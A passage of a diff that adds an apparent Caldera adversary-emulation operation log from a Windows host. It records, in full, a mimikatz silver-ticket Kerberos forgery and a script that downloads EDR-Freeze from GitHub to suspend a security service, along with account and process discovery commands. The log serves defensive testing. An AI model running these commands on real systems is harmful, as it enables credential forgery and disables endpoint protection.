+            "variations": [],
+            "additional_info": {}
+          }
+        ],
+        "requirements": [],
+        "privilege": null,
+        "repeatable": false,
+        "buckets": [
+          "credential-access"
+        ],
+        "additional_info": {},
+        "access": {},
+        "singleton": false,
+        "plugin": "atomic",
+        "delete_payload": true
+      },
+      "executor": {
+        "name": "psh",
+        "platform": "windows",
+        "command": "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore; $domain_sid = \"S-1-5-21-DEFAULT\"; If ($domain_sid -Match \"DEFAULT\") {;   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')); }; @\"; >%TEMP%\\silver.txt 2>&1 (;   echo Purge existing tickets and create silver ticket:;   klist purge;   PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\\\=%.%userdnsdomain% /ptt\" \"exit\";   echo.;   echo executing:schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   ;   echo.;   echo Tickets after requesting schtasks:;   klist;   echo.;   echo End of Silver Ticket attack; ); \"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Silver Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\silver.txt; Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore",
+        "code": null,
+        "language": null,
+        "build_target": null,
+        "payloads": [],
+        "uploads": [],
+        "timeout": 60,
+        "parsers": [
+          {
+            "module": "plugins.atomic.app.parsers.atomic_powershell",
+            "parserconfigs": [
+              {
+                "source": "validate_me",
+                "edge": "",
+                "target": "",
+                "custom_parser_vals": {}
+              }
+            ]
+          }
+        ],
+        "cleanup": [],
+        "variations": [],
+        "additional_info": {}
+      },
+      "cleanup": 0,
+      "visibility": {
+        "score": 50,
+        "adjustments": []
+      },
+      "host": "WS10",
+      "output": "True",
+      "deadman": false,
+      "agent_reported_time": "2026-04-01T13:47:24Z"
+    },
+    {
+      "id": "0d02e948-0045-4a9b-a2e0-b8e17a007065",
+      "paw": "fgdafj",
+      "command": "Add-Type -TypeDefinition @\"; using System; using System.Runtime.InteropServices; public class TokenAdjuster {;     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,;         ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);     [StructLayout(LayoutKind.Sequential, Pack = 1)];     public struct TOKEN_PRIVILEGES {;         public int PrivilegeCount;         public long Luid;         public int Attributes;     };     public const int SE_PRIVILEGE_ENABLED = 0x00000002;     public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;     public const uint TOKEN_QUERY = 0x0008;     public static bool EnableSeDebugPrivilege() {;         IntPtr hToken;         if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken));             return false;         long luid;         if (!LookupPrivilegeValue(null, \"SeDebugPrivilege\", out luid));             return false;         TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();         tp.PrivilegeCount = 1;         tp.Luid = luid;         tp.Attributes = SE_PRIVILEGE_ENABLED;         return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);     }; }; \"@; $result = [TokenAdjuster]::EnableSeDebugPrivilege(); if ($result) {;     Write-Host \"SeDebugPrivilege enabled successfully.\" -ForegroundColor Green; } else {;     Write-Host \"Failed to enable SeDebugPrivilege.\" -ForegroundColor Red;     exit 1; }; $process = Get-Process -Name $SecurityHealthService -ErrorAction Stop; $processName = $process.ProcessName; Write-Host \"Process Name: $processName)\"; Write-Host \"PID: $($process.Id)\";         ; $query = \"SELECT * FROM Win32_Process WHERE Name = '$processName.exe'\"; $wmiProcess = Get-WmiObject -Query $query; $owner = $wmiProcess.GetOwner();     Write-Host \"User: $($owner.Domain)\\$($owner.User)\"; $scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition; $downloadUrl = \"https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip\"; $zipPath = Join-Path $scriptFolder \"EDR-Freeze_1.0.zip\"; Write-Host \"Downloading latest EDR-Freeze from $downloadUrl\" -ForegroundColor Cyan; try {;     Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop;     Write-Host \"Download completed: $zipPath\" -ForegroundColor Green;     $extractFolder = $scriptFolder;     if (Test-Path $zipPath) {;         Write-Host \"Extracting archive to $extractFolder (overwriting existing files)\" -ForegroundColor Cyan;         if (Test-Path $extractFolder) {;             Get-Process -Name \"EDR-Freeze_1.0\" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue;         };         Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null;         $archive = $null;         try {;             $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath);             foreach ($entry in $archive.Entries) {;                 if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue };                 if ($entry.FullName.EndsWith('/')) {;                     $dirPath = Join-Path $extractFolder $entry.FullName;                     if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null };                     continue;                 };                 $destPath = Join-Path $extractFolder $entry.FullName;                 $destDir = Split-Path $destPath -Parent;                 if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null };                 if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue };                 try {;                     [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false);                 } catch {;                     Write-Host \"Failed to extract entry $($entry.FullName): $_\" -ForegroundColor Yellow;                 };             };             Write-Host \"Extraction completed.\" -ForegroundColor Green;         } finally {;             if ($archive) { $archive.Dispose() };         };     }; } catch {;     Write-Host \"Failed to download or extract EDR-Freeze: $_\" -ForegroundColor Red; }; Write-Host \"Waiting 15s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 10s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 5s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 3; Write-Host \"Waiting 2s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 2; $edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |;     Sort-Object LastWriteTime -Descending |;     Select-Object -First 1 -ExpandProperty Name; if (-not $edrFreezeExeName) {;     Write-Host \"No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder\" -ForegroundColor Red;     exit 1; }; $edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName; Write-Host \"Using EDR-Freeze executable: $edrFreezeExeName\" -ForegroundColor Cyan; Write-Host \"$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)\" -ForegroundColor Yellow; Start-Process -FilePath $edrFreezeExe -ArgumentList (\"$($process.Id) 15000\") | Out-Null",
+      "plaintext_command": "Add-Type -TypeDefinition @\"; using System; using System.Runtime.InteropServices; public class TokenAdjuster {;     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,;         ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);     [StructLayout(LayoutKind.Sequential, Pack = 1)];     public struct TOKEN_PRIVILEGES {;         public int PrivilegeCount;         public long Luid;         public int Attributes;     };     public const int SE_PRIVILEGE_ENABLED = 0x00000002;     public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;     public const uint TOKEN_QUERY = 0x0008;     public static bool EnableSeDebugPrivilege() {;         IntPtr hToken;         if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken));             return false;         long luid;         if (!LookupPrivilegeValue(null, \"SeDebugPrivilege\", out luid));             return false;         TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();         tp.PrivilegeCount = 1;         tp.Luid = luid;         tp.Attributes = SE_PRIVILEGE_ENABLED;         return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);     }; }; \"@; $result = [TokenAdjuster]::EnableSeDebugPrivilege(); if ($result) {;     Write-Host \"SeDebugPrivilege enabled successfully.\" -ForegroundColor Green; } else {;     Write-Host \"Failed to enable SeDebugPrivilege.\" -ForegroundColor Red;     exit 1; }; $process = Get-Process -Name $SecurityHealthService -ErrorAction Stop; $processName = $process.ProcessName; Write-Host \"Process Name: $processName)\"; Write-Host \"PID: $($process.Id)\";         ; $query = \"SELECT * FROM Win32_Process WHERE Name = '$processName.exe'\"; $wmiProcess = Get-WmiObject -Query $query; $owner = $wmiProcess.GetOwner();     Write-Host \"User: $($owner.Domain)\\$($owner.User)\"; $scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition; $downloadUrl = \"https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip\"; $zipPath = Join-Path $scriptFolder \"EDR-Freeze_1.0.zip\"; Write-Host \"Downloading latest EDR-Freeze from $downloadUrl\" -ForegroundColor Cyan; try {;     Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop;     Write-Host \"Download completed: $zipPath\" -ForegroundColor Green;     $extractFolder = $scriptFolder;     if (Test-Path $zipPath) {;         Write-Host \"Extracting archive to $extractFolder (overwriting existing files)\" -ForegroundColor Cyan;         if (Test-Path $extractFolder) {;             Get-Process -Name \"EDR-Freeze_1.0\" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue;         };         Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null;         $archive = $null;         try {;             $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath);             foreach ($entry in $archive.Entries) {;                 if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue };                 if ($entry.FullName.EndsWith('/')) {;                     $dirPath = Join-Path $extractFolder $entry.FullName;                     if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null };                     continue;                 };                 $destPath = Join-Path $extractFolder $entry.FullName;                 $destDir = Split-Path $destPath -Parent;                 if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null };                 if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue };                 try {;                     [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false);                 } catch {;                     Write-Host \"Failed to extract entry $($entry.FullName): $_\" -ForegroundColor Yellow;                 };             };             Write-Host \"Extraction completed.\" -ForegroundColor Green;         } finally {;             if ($archive) { $archive.Dispose() };         };     }; } catch {;     Write-Host \"Failed to download or extract EDR-Freeze: $_\" -ForegroundColor Red; }; Write-Host \"Waiting 15s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 10s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 5s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 3; Write-Host \"Waiting 2s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 2; $edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |;     Sort-Object LastWriteTime -Descending |;     Select-Object -First 1 -ExpandProperty Name; if (-not $edrFreezeExeName) {;     Write-Host \"No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder\" -ForegroundColor Red;     exit 1; }; $edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName; Write-Host \"Using EDR-Freeze executable: $edrFreezeExeName\" -ForegroundColor Cyan; Write-Host \"$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)\" -ForegroundColor Yellow; Start-Process -FilePath $edrFreezeExe -ArgumentList (\"$($process.Id) 15000\") | Out-Null",
+      "status": 1,
+      "score": 0,
+      "decide": "2026-04-01T13:47:24Z",
+      "pin": 0,
+      "pid": "4296",
+      "facts": [],
+      "relationships": [],
+      "used": [],
+      "unique": "0d02e948-0045-4a9b-a2e0-b8e17a007065",
+      "collect": "2026-04-01T13:48:21Z",
+      "finish": "2026-04-01T13:48:22Z",
+      "ability": {
+        "ability_id": "54ebf8b23105d20c98156afd96b97c81",
+        "tactic": "defense-evasion",
+        "technique_name": "Impair Defenses: Disable or Modify Tools",
+        "technique_id": "T1562.001",
+        "name": "Freeze PPL-protected process with EDR-Freeze",
+        "description": "This test utilizes the tool EDR-Freeze, which leverages the native Microsoft binary WerFaultSecure.exe to suspend processes protected by the Protected Process Light mechanism. PPL is a Windows security feature designed to safeguard critical system processes — such as those related to antivirus, credential protection, and system integrity — from tampering or inspection. These processes operate in a restricted environment that prevents access even from administrators or debugging tools, unless the accessing tool is signed and trusted by Microsoft. By using WerFaultSecure.exe, which is inherently trusted by the operating system, EDR-Freeze is able to bypass these restrictions and temporarily freeze PPL-protected processes for analysis or testing purposes.",
+        "executors": [
+          {
+            "name": "psh",
+            "platform": "windows",
+            "command": "Add-Type -TypeDefinition @\"; using System; using System.Runtime.InteropServices; public class TokenAdjuster {;     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,;         ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);     [StructLayout(LayoutKind.Sequential, Pack = 1)];     public struct TOKEN_PRIVILEGES {;         public int PrivilegeCount;         public long Luid;         public int Attributes;     };     public const int SE_PRIVILEGE_ENABLED = 0x00000002;     public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;     public const uint TOKEN_QUERY = 0x0008;     public static bool EnableSeDebugPrivilege() {;         IntPtr hToken;         if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken));             return false;         long luid;         if (!LookupPrivilegeValue(null, \"SeDebugPrivilege\", out luid));             return false;         TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();         tp.PrivilegeCount = 1;         tp.Luid = luid;         tp.Attributes = SE_PRIVILEGE_ENABLED;         return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);     }; }; \"@; $result = [TokenAdjuster]::EnableSeDebugPrivilege(); if ($result) {;     Write-Host \"SeDebugPrivilege enabled successfully.\" -ForegroundColor Green; } else {;     Write-Host \"Failed to enable SeDebugPrivilege.\" -ForegroundColor Red;     exit 1; }; $process = Get-Process -Name $SecurityHealthService -ErrorAction Stop; $processName = $process.ProcessName; Write-Host \"Process Name: $processName)\"; Write-Host \"PID: $($process.Id)\";         ; $query = \"SELECT * FROM Win32_Process WHERE Name = '$processName.exe'\"; $wmiProcess = Get-WmiObject -Query $query; $owner = $wmiProcess.GetOwner();     Write-Host \"User: $($owner.Domain)\\$($owner.User)\"; $scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition; $downloadUrl = \"https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip\"; $zipPath = Join-Path $scriptFolder \"EDR-Freeze_1.0.zip\"; Write-Host \"Downloading latest EDR-Freeze from $downloadUrl\" -ForegroundColor Cyan; try {;     Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop;     Write-Host \"Download completed: $zipPath\" -ForegroundColor Green;     $extractFolder = $scriptFolder;     if (Test-Path $zipPath) {;         Write-Host \"Extracting archive to $extractFolder (overwriting existing files)\" -ForegroundColor Cyan;         if (Test-Path $extractFolder) {;             Get-Process -Name \"EDR-Freeze_1.0\" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue;         };         Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null;         $archive = $null;         try {;             $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath);             foreach ($entry in $archive.Entries) {;                 if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue };                 if ($entry.FullName.EndsWith('/')) {;                     $dirPath = Join-Path $extractFolder $entry.FullName;                     if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null };                     continue;                 };                 $destPath = Join-Path $extractFolder $entry.FullName;                 $destDir = Split-Path $destPath -Parent;                 if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null };                 if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue };                 try {;                     [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false);                 } catch {;                     Write-Host \"Failed to extract entry $($entry.FullName): $_\" -ForegroundColor Yellow;                 };             };             Write-Host \"Extraction completed.\" -ForegroundColor Green;         } finally {;             if ($archive) { $archive.Dispose() };         };     }; } catch {;     Write-Host \"Failed to download or extract EDR-Freeze: $_\" -ForegroundColor Red; }; Write-Host \"Waiting 15s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 10s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 5s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 3; Write-Host \"Waiting 2s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 2; $edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |;     Sort-Object LastWriteTime -Descending |;     Select-Object -First 1 -ExpandProperty Name; if (-not $edrFreezeExeName) {;     Write-Host \"No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder\" -ForegroundColor Red;     exit 1; }; $edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName; Write-Host \"Using EDR-Freeze executable: $edrFreezeExeName\" -ForegroundColor Cyan; Write-Host \"$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)\" -ForegroundColor Yellow; Start-Process -FilePath $edrFreezeExe -ArgumentList (\"$($process.Id) 15000\") | Out-Null",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [
+              {
+                "module": "plugins.atomic.app.parsers.atomic_powershell",
+                "parserconfigs": [
+                  {
+                    "source": "validate_me",
+                    "edge": "",
+                    "target": "",
+                    "custom_parser_vals": {}
+                  }
+                ]
+              }
+            ],
+            "cleanup": [
+              "Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue; Write-Output \"File deleted: $edrFreezeExe\""
+            ],
+            "variations": [],
+            "additional_info": {}
+          }
+        ],
+        "requirements": [],
+        "privilege": null,
+        "repeatable": false,
+        "buckets": [
+          "defense-evasion"
+        ],
+        "additional_info": {},
+        "access": {},
+        "singleton": false,
+        "plugin": "atomic",
+        "delete_payload": true
+      },
+      "executor": {
+        "name": "psh",
+        "platform": "windows",
+        "command": "Add-Type -TypeDefinition @\"; using System; using System.Runtime.InteropServices; public class TokenAdjuster {;     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,;         ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);     [StructLayout(LayoutKind.Sequential, Pack = 1)];     public struct TOKEN_PRIVILEGES {;         public int PrivilegeCount;         public long Luid;         public int Attributes;     };     public const int SE_PRIVILEGE_ENABLED = 0x00000002;     public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;     public const uint TOKEN_QUERY = 0x0008;     public static bool EnableSeDebugPrivilege() {;         IntPtr hToken;         if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken));             return false;         long luid;         if (!LookupPrivilegeValue(null, \"SeDebugPrivilege\", out luid));             return false;         TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();         tp.PrivilegeCount = 1;         tp.Luid = luid;         tp.Attributes = SE_PRIVILEGE_ENABLED;         return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);     }; }; \"@; $result = [TokenAdjuster]::EnableSeDebugPrivilege(); if ($result) {;     Write-Host \"SeDebugPrivilege enabled successfully.\" -ForegroundColor Green; } else {;     Write-Host \"Failed to enable SeDebugPrivilege.\" -ForegroundColor Red;     exit 1; }; $process = Get-Process -Name $SecurityHealthService -ErrorAction Stop; $processName = $process.ProcessName; Write-Host \"Process Name: $processName)\"; Write-Host \"PID: $($process.Id)\";         ; $query = \"SELECT * FROM Win32_Process WHERE Name = '$processName.exe'\"; $wmiProcess = Get-WmiObject -Query $query; $owner = $wmiProcess.GetOwner();     Write-Host \"User: $($owner.Domain)\\$($owner.User)\"; $scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition; $downloadUrl = \"https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip\"; $zipPath = Join-Path $scriptFolder \"EDR-Freeze_1.0.zip\"; Write-Host \"Downloading latest EDR-Freeze from $downloadUrl\" -ForegroundColor Cyan; try {;     Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop;     Write-Host \"Download completed: $zipPath\" -ForegroundColor Green;     $extractFolder = $scriptFolder;     if (Test-Path $zipPath) {;         Write-Host \"Extracting archive to $extractFolder (overwriting existing files)\" -ForegroundColor Cyan;         if (Test-Path $extractFolder) {;             Get-Process -Name \"EDR-Freeze_1.0\" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue;         };         Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null;         $archive = $null;         try {;             $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath);             foreach ($entry in $archive.Entries) {;                 if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue };                 if ($entry.FullName.EndsWith('/')) {;                     $dirPath = Join-Path $extractFolder $entry.FullName;                     if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null };                     continue;                 };                 $destPath = Join-Path $extractFolder $entry.FullName;                 $destDir = Split-Path $destPath -Parent;                 if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null };                 if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue };                 try {;                     [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false);                 } catch {;                     Write-Host \"Failed to extract entry $($entry.FullName): $_\" -ForegroundColor Yellow;                 };             };             Write-Host \"Extraction completed.\" -ForegroundColor Green;         } finally {;             if ($archive) { $archive.Dispose() };         };     }; } catch {;     Write-Host \"Failed to download or extract EDR-Freeze: $_\" -ForegroundColor Red; }; Write-Host \"Waiting 15s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 10s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 5s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 3; Write-Host \"Waiting 2s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 2; $edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |;     Sort-Object LastWriteTime -Descending |;     Select-Object -First 1 -ExpandProperty Name; if (-not $edrFreezeExeName) {;     Write-Host \"No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder\" -ForegroundColor Red;     exit 1; }; $edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName; Write-Host \"Using EDR-Freeze executable: $edrFreezeExeName\" -ForegroundColor Cyan; Write-Host \"$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)\" -ForegroundColor Yellow; Start-Process -FilePath $edrFreezeExe -ArgumentList (\"$($process.Id) 15000\") | Out-Null",
+        "code": null,
+        "language": null,
+        "build_target": null,
+        "payloads": [],
+        "uploads": [],
+        "timeout": 60,
+        "parsers": [
+          {
+            "module": "plugins.atomic.app.parsers.atomic_powershell",
+            "parserconfigs": [
+              {
+                "source": "validate_me",
+                "edge": "",
+                "target": "",
+                "custom_parser_vals": {}
+              }
+            ]
+          }
+        ],
+        "cleanup": [
+          "Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue; Write-Output \"File deleted: $edrFreezeExe\""
+        ],
+        "variations": [],
+        "additional_info": {}
+      },
+      "cleanup": 0,
+      "visibility": {
+        "score": 50,
+        "adjustments": []
+      },
+      "host": "WS10",
+      "output": "True",
+      "deadman": false,
+      "agent_reported_time": "2026-04-01T13:48:22Z"
+    },
+    {
+      "id": "af7bf1e6-6b76-4b72-89f5-046815b5284d",
+      "paw": "fgdafj",
+      "command": "Get-WmiObject -Class Win32_UserAccount",
+      "plaintext_command": "Get-WmiObject -Class Win32_UserAccount",
+      "status": 0,
+      "score": 0,
+      "decide": "2026-04-01T13:48:25Z",
+      "pin": 0,
+      "pid": "7648",
+      "facts": [],
+      "relationships": [],
+      "used": [],
+      "unique": "af7bf1e6-6b76-4b72-89f5-046815b5284d",
+      "collect": "2026-04-01T13:49:14Z",
+      "finish": "2026-04-01T13:49:14Z",
+      "ability": {
+        "ability_id": "feaced8f-f43f-452a-9500-a5219488abb8",
+        "tactic": "discovery",
+        "technique_name": "Account Discovery: Local Account",
+        "technique_id": "T1087.001",
+        "name": "Identify local users",
+        "description": "Identify all local users",
+        "executors": [
+          {
+            "name": "sh",
+            "platform": "darwin",
+            "command": "dscl . list /Users | grep -v '_'",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [],
+            "cleanup": [],
+            "variations": [],
+            "additional_info": {}
+          },
+          {
+            "name": "psh",
+            "platform": "windows",
+            "command": "Get-WmiObject -Class Win32_UserAccount",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [],
+            "cleanup": [],
+            "variations": [],
+            "additional_info": {}
+          }
+        ],
+        "requirements": [],
+        "privilege": null,
+        "repeatable": false,
+        "buckets": [
+          "discovery"
+        ],
+        "additional_info": {},
+        "access": {},
+        "singleton": false,
+        "plugin": "stockpile",
+        "delete_payload": true
+      },
+      "executor": {
+        "name": "psh",
+        "platform": "windows",
+        "command": "Get-WmiObject -Class Win32_UserAccount",
+        "code": null,
+        "language": null,
+        "build_target": null,
+        "payloads": [],
+        "uploads": [],
+        "timeout": 60,
+        "parsers": [],
+        "cleanup": [],
+        "variations": [],
+        "additional_info": {}
+      },
+      "cleanup": 0,
+      "visibility": {
+        "score": 50,
+        "adjustments": []
+      },
+      "host": "WS10",
+      "output": "True",
+      "deadman": false,
+      "agent_reported_time": "2026-04-01T13:49:14Z"
+    },
+    {
+      "id": "a18ccb62-dd9a-4cbd-8fa2-4226cd90855c",
+      "paw": "fgdafj",
+      "command": "get-wmiObject -class Win32_Process",
+      "plaintext_command": "get-wmiObject -class Win32_Process",
+      "status": 1,
+      "score": 0,
+      "decide": "2026-04-01T13:49:19Z",
+      "pin": 0,
+      "pid": "7380",
+      "facts": [],
+      "relationships": [],
+      "used": [],
+      "unique": "a18ccb62-dd9a-4cbd-8fa2-4226cd90855c",
+      "collect": "2026-04-01T13:49:56Z",
